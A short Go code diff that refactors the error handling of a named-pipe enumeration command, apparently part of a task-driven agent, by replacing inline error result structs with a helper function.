@@ -51,21 +51,13 @@ func (c *NamedPipesCommand) Execute(task structs.Task) structs.CommandResult {
 	var args namedPipesArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Failed to parse parameters: %v", err)
 		}
 	}
 
 	pipes, err := enumerateNamedPipes()
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to enumerate named pipes: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to enumerate named pipes: %v", err)
 	}
 
 	// Filter if specified
